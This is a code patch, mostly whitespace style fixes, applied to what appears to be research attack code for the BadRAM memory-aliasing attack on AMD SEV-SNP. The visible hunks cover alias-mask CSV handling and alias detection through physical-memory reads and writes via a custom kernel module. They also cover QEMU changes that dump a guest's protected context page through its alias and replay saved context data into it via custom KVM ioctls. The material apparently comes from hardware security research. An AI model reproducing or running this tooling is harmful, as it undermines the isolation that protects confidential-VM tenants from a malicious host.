@@ -98,7 +98,7 @@ index 0000000000..0e6baccbe8
 +		return -1;
 +	}
 +
-+	if(ioctl(kvm_fd, KVM_BADRAM_GET_GCTX_PA, &args)) {
++	if (ioctl(kvm_fd, KVM_BADRAM_GET_GCTX_PA, &args)) {
 +		err_log("KVM_BADRAM_GET_GCTX_PA failed\n");
 +		close(kvm_fd);
 +		return -1;
@@ -116,7 +116,7 @@ index 0000000000..0e6baccbe8
 +		return -1;
 +	}
 +
-+	if(ioctl(kvm_fd, KVM_BADRAM_REPLAY_GCTX, &args)) {
++	if (ioctl(kvm_fd, KVM_BADRAM_REPLAY_GCTX, &args)) {
 +		err_log("KVM_BADRAM_GET_GCTX_PA failed\n");
 +		close(kvm_fd);
 +		return -1;
@@ -196,7 +196,7 @@ index 0000000000..aaf7b47f65
 +
 +void hexdump(uint8_t* a, const size_t n)
 +{
-+	for(size_t i = 0; i < n; i++) {
++	for (size_t i = 0; i < n; i++) {
 +    if (a[i]) printf("\x1b[31m%02x \x1b[0m", a[i]);
 +    else printf("%02x ", a[i]);
 +    if (i % 64 == 63) printf("\n");
@@ -221,7 +221,7 @@ index 0000000000..aaf7b47f65
 +}
 +
 +int get_alias(uint64_t pa, mem_range_t* mrs, uint64_t* alias_masks, size_t len, uint64_t* out_alias) {
-+  for(size_t i = 0; i < len; i++) {
++  for (size_t i = 0; i < len; i++) {
 +    if ((pa >= mrs[i].start) && (pa < mrs[i].end)) {
 +      *out_alias = pa ^ alias_masks[i];
 +      return 0;
@@ -287,19 +287,19 @@ index 0000000000..91b2c361b6
 +
 +int write_csv(char* path, mem_range_t* mr, uint64_t* alias_masks,  size_t len) {
 +  FILE* f = fopen(path, "w");
-+  if(!f) {
++  if (!f) {
 +    err_log("Failed to create file %s : %s", path, strerror(errno))
 +    return -1;
 +  }
 +
 +  //write csv header
-+  if(-1 == fprintf(f,"#start pa, end pa, alias xor mask\n")){
++  if (-1 == fprintf(f,"#start pa, end pa, alias xor mask\n")){
 +    err_log("failed to write : %s\n", strerror(errno));
 +    fclose(f);
 +    return -1;
 +  }
 +  //write csv data
-+  for(size_t i = 0; i < len; i++) {
++  for (size_t i = 0; i < len; i++) {
 +    if (-1 == fprintf(f, "0x%jx,0x%jx,0x%jx\n", mr[i].start, mr[i].end, alias_masks[i])) {
 +      err_log("failed to write : %s\n", strerror(errno));
 +      fclose(f);
@@ -319,7 +319,7 @@ index 0000000000..91b2c361b6
 +  uint64_t* alias_masks = NULL;
 +  size_t idx;
 +  int retval = 0;
-+  if(!f) {
++  if (!f) {
 +    err_log("Failed to open %s for reading : %s\n", path, strerror(errno));
 +    return -1;
 +  }
@@ -397,7 +397,7 @@ index 0000000000..91b2c361b6
 +    free(alias_masks);
 +  }
 +cleanup:
-+  if(f) {
++  if (f) {
 +    fclose(f);
 +  }
 +  if (buf) {
@@ -721,7 +721,7 @@ index 0000000000..1908266433
 +    error:
 +        ret = -1;
 +    cleanup:
-+    if(iomem) {
++    if (iomem) {
 +        fclose(iomem);
 +    }
 +    return ret;
@@ -818,7 +818,7 @@ index 0000000000..b22e566bcc
 +
 +static void _hexdump(uint8_t* a, const size_t n)
 +{
-+	for(size_t i = 0; i < n; i++) {
++	for (size_t i = 0; i < n; i++) {
 +    if (a[i]) printf("\x1b[31m%02x \x1b[0m", a[i]);
 +    else printf("%02x ", a[i]);
 +    if (i % 64 == 63) printf("\n");
@@ -918,7 +918,7 @@ index 0000000000..b22e566bcc
 +        break;
 +      case 2:
 +        out_stats->map_failed += 1;
-+        if(err_on_access_fail) {
++        if (err_on_access_fail) {
 +          return -1;
 +        }
 +        break;
@@ -1027,36 +1027,36 @@ index 0000000000..b22e566bcc
 +    uint8_t m1[msg_len], m2[msg_len], mxor[msg_len], buf1[msg_len], buf2[msg_len], bufxor[msg_len];
 +    _get_rand_bytes(m1, msg_len);
 +    _get_rand_bytes(m2, msg_len);
-+    for(size_t i = 0; i < msg_len; i++) {
++    for (size_t i = 0; i < msg_len; i++) {
 +        mxor[i] = m1[i] ^ m2[i];
 +    }
 +
 +    if (flush_ext(source_pa, msg_len, memcpy_cfg)) {
-+        if(verbose) err_log("flush_range for 0x%jx failed\n", source_pa);
++        if (verbose) err_log("flush_range for 0x%jx failed\n", source_pa);
 +        return CHECK_ALIAS_ERR_ACCESS;
 +    }
 +
 +    if (memcpy_topa_ext(source_pa, m1, msg_len, memcpy_cfg)) {
-+        if(verbose) err_log("memcpy_topa for 0x%jx failed\n", source_pa);
++        if (verbose) err_log("memcpy_topa for 0x%jx failed\n", source_pa);
 +        return CHECK_ALIAS_ERR_ACCESS;
 +    }
 +
 +    //read alias_candidate_pa
 +    if (memcpy_frompa_ext(buf1, alias_candidate, msg_len, memcpy_cfg)) {
-+        if(verbose) err_log("memcpy_frompa for 0x%jx failed\n", alias_candidate);
++        if (verbose) err_log("memcpy_frompa for 0x%jx failed\n", alias_candidate);
 +        return CHECK_ALIAS_ERR_ACCESS;
 +    }
 +
 +
 +    //write m2 to source_pa
 +    if (memcpy_topa_ext(source_pa, m2, msg_len, memcpy_cfg)) {
-+        if(verbose) err_log("memcpy_topa for source_pa 0x%jx failed\n", source_pa);
++        if (verbose) err_log("memcpy_topa for source_pa 0x%jx failed\n", source_pa);
 +        return CHECK_ALIAS_ERR_ACCESS;
 +    }
 +
 +    //read from target_pa
 +    if (memcpy_frompa_ext(buf2, alias_candidate, msg_len, memcpy_cfg)) {
-+        if(verbose) err_log("memcpy_frompa for target_pa 0x%jx failed\n", alias_candidate);
++        if (verbose) err_log("memcpy_frompa for target_pa 0x%jx failed\n", alias_candidate);
 +        return CHECK_ALIAS_ERR_ACCESS;
 +    }
 +
@@ -1085,7 +1085,7 @@ index 0000000000..b22e566bcc
 +#endif
 +           
 +    int found_matching_xor = 1;
-+    for(size_t i = 0; i < msg_len; i++) {
++    for (size_t i = 0; i < msg_len; i++) {
 +        bufxor[i] = buf1[i] ^ buf2[i];
 +        if (mxor[i] != bufxor[i]) {
 +            found_matching_xor = 0;
@@ -1097,7 +1097,7 @@ index 0000000000..b22e566bcc
 +#endif
 +
 +    if (found_matching_xor) {
-+        if(verbose) {
++        if (verbose) {
 +            uint64_t pa_xor = source_pa ^ alias_candidate;
 +            printf("Found alias for 0x%jx at 0x%jx! xor diff = 0x%jx\n", source_pa, alias_candidate, pa_xor);
 +            printf("buf1: ");
@@ -1329,7 +1329,7 @@ index 7c87f45de7..d5b14c2920 100644
 +static char* get_alias_csv(void) {
 +    char* c;
 +    c = getenv(ENV_ALIAS_CSV);
-+    if(c) {
++    if (c) {
 +        return c;
 +    }
 +    return (char*)"./edited-aliases.csv";
@@ -1338,7 +1338,7 @@ index 7c87f45de7..d5b14c2920 100644
 +static char* get_replay_data(void) {
 +    char* c;
 +    c = getenv(ENV_REPLAY_DATA);
-+    if(c) {
++    if (c) {
 +        return c;
 +    }
 +    return (char*)"./replay-with-this.bin";
@@ -1347,7 +1347,7 @@ index 7c87f45de7..d5b14c2920 100644
 +static char* get_dump_dir(void) {
 +    char* c;
 +    c = getenv(ENV_DUMP_DIR);
-+    if(c) {
++    if (c) {
 +        return c;
 +    }
 +    return (char*)"./";
@@ -1371,7 +1371,7 @@ index 7c87f45de7..d5b14c2920 100644
 +    //check if file at replay_data_path exists. For now,
 +    //this is our "toggle" whether we should do the replay or not
 +    replay_data_file = fopen(replay_data_path, "rb");
-+    if(!replay_data_file) {
++    if (!replay_data_file) {
 +        printf("Failed to open replay_data file at %s\nSkipping replay\n",
 +            replay_data_path);
 +        //N.B: NOT and error (for now)
@@ -1384,23 +1384,23 @@ index 7c87f45de7..d5b14c2920 100644
 +
 +
 +
-+    if(parse_csv((char*)alias_file_path, &mrs, &alias_masks, &mrs_len)) {
++    if (parse_csv((char*)alias_file_path, &mrs, &alias_masks, &mrs_len)) {
 +        err_log("failed to parse aliases from %s\n", alias_file_path);
 +        goto error;
 +    }
 +
-+    if(open_kmod()) {
++    if (open_kmod()) {
 +        err_log("failed to open readalias kernel module? Did you insmod it?\n");
 +        goto error;
 +    }
 +
-+    if(badram_get_gctx(getpid(), &gctx_pa)) {
++    if (badram_get_gctx(getpid(), &gctx_pa)) {
 +        err_log("badram_get_gctx failed\n");
 +        goto error;
 +    }
 +    printf("Using 0x%jx for guest context page\n", gctx_pa);
 +
-+    if(get_alias(gctx_pa, mrs, alias_masks, mrs_len, &alias_gctx_pa)) {
++    if (get_alias(gctx_pa, mrs, alias_masks, mrs_len, &alias_gctx_pa)) {
 +        err_log("failed to get alias for 0x%jx\n", gctx_pa);
 +        goto error;
 +    }
@@ -1412,7 +1412,7 @@ index 7c87f45de7..d5b14c2920 100644
 +    args.expected_gctx_pa = gctx_pa;
 +    args.gctx_alias_pa = alias_gctx_pa;
 +    
-+    if(badram_request_gctx_replay(args)) {
++    if (badram_request_gctx_replay(args)) {
 +        err_log("badram_request_gctx_replay failed\n");
 +        goto error;
 +    }
@@ -1424,9 +1424,9 @@ index 7c87f45de7..d5b14c2920 100644
 +    ret = -1;
 +cleanup:
 +    close_kmod();
-+    if(mrs) free(mrs);
-+    if(alias_masks) free(alias_masks);
-+    if(replay_data_file) fclose(replay_data_file);
++    if (mrs) free(mrs);
++    if (alias_masks) free(alias_masks);
++    if (replay_data_file) fclose(replay_data_file);
 +    return ret;   
 +}
 +
@@ -1444,39 +1444,39 @@ index 7c87f45de7..d5b14c2920 100644
 +    size_t mrs_len;
 +    page_stats_t stats;
 +
-+    if(parse_csv((char*)alias_file_path, &mrs, &alias_masks, &mrs_len)) {
++    if (parse_csv((char*)alias_file_path, &mrs, &alias_masks, &mrs_len)) {
 +        err_log("failed to parse aliases from %s\n", alias_file_path);
 +        goto error;
 +    }
 +
-+    if(open_kmod()) {
++    if (open_kmod()) {
 +        err_log("failed to open readalias kernel module? Did you insmod it?\n");
 +        goto error;
 +    }
 +
 +    if (gctx_pa == 0) {
-+        if(badram_get_gctx(getpid(), &gctx_pa)) {
++        if (badram_get_gctx(getpid(), &gctx_pa)) {
 +            err_log("badram_get_gctx failed\n");
 +            goto error;
 +        }
 +    }
 +    printf("Using 0x%jx for guest context page\n", gctx_pa);
 +
-+    if(get_alias(gctx_pa, mrs, alias_masks, mrs_len, &alias_gctx_pa)) {
++    if (get_alias(gctx_pa, mrs, alias_masks, mrs_len, &alias_gctx_pa)) {
 +        err_log("failed to get alias for 0x%jx\n", gctx_pa);
 +        goto error;
 +    }
 +
-+    if(wbinvd_ac()) {
++    if (wbinvd_ac()) {
 +        err_log("wbinvd failed\n");
 +        goto error;
 +    }
 +    gctx_buffer = malloc(gctx_bytes);
-+    if(memcpy_frompa(gctx_buffer, alias_gctx_pa, gctx_bytes , &stats , true )) {
++    if (memcpy_frompa(gctx_buffer, alias_gctx_pa, gctx_bytes , &stats , true )) {
 +        err_log("memcpy_frompa failed\n");
 +        goto error;
 +    }
-+    if(wbinvd_ac()) {
++    if (wbinvd_ac()) {
 +        err_log("wbinvd failed\n");
 +        goto error;
 +    }
@@ -1491,7 +1491,7 @@ index 7c87f45de7..d5b14c2920 100644
 +        }
 +    }
 +    gctx_dump_file = fopen(gctx_dump_path, "wb");
-+    if(!gctx_dump_file) {
++    if (!gctx_dump_file) {
 +        err_log("failed to create dump file %s\n", gctx_dump_path);
 +        goto error;
 +    }
@@ -1506,11 +1506,11 @@ index 7c87f45de7..d5b14c2920 100644
 +    ret = -1;
 +cleanup:
 +    close_kmod();
-+    if(mrs) free(mrs);
-+    if(alias_masks) free(alias_masks);
-+    if(gctx_dump_file) fclose(gctx_dump_file);
-+    if(gctx_buffer) free(gctx_buffer);
-+    if(gctx_dump_path) free(gctx_dump_path);
++    if (mrs) free(mrs);
++    if (alias_masks) free(alias_masks);
++    if (gctx_dump_file) fclose(gctx_dump_file);
++    if (gctx_buffer) free(gctx_buffer);
++    if (gctx_dump_path) free(gctx_dump_path);
 +    invocation_count += 1;
 +    return ret;
 +}
@@ -1522,7 +1522,7 @@ index 7c87f45de7..d5b14c2920 100644
          goto out;
      }
  
-+    if(dump_context_page()) {
++    if (dump_context_page()) {
 +        error_report("%s:%d %s : dump_context_page failed!\n", __FILE__, __LINE__, __FUNCTION__);
 +        ret = -1;
 +        goto out;
@@ -1534,7 +1534,7 @@ index 7c87f45de7..d5b14c2920 100644
          }
      }
  
-+    if(dump_context_page()) {
++    if (dump_context_page()) {
 +        error_report("%s:%d %s : dump_context_page failed!\n", __FILE__, __LINE__, __FUNCTION__);
 +        exit(1);
 +    }
@@ -1549,7 +1549,7 @@ index 7c87f45de7..d5b14c2920 100644
 +    //also does the the vmcb measurements which will modify our replayed data
 +    //I have implemented the replay directly inside the kernel
 +
-+    if(request_replay()) {
++    if (request_replay()) {
 +        error_report("%s:%d %s : request_replay failed", __FILE__, __LINE__, __FUNCTION__);
 +        exit(1);
 +    }
@@ -1562,7 +1562,7 @@ index 7c87f45de7..d5b14c2920 100644
          exit(1);
      }
  
-+    if(dump_context_page()) {
++    if (dump_context_page()) {
 +        error_report("%s:%d %s : dump_context_page failed!\n", __FILE__, __LINE__, __FUNCTION__);
 +        exit(1);
 +    }
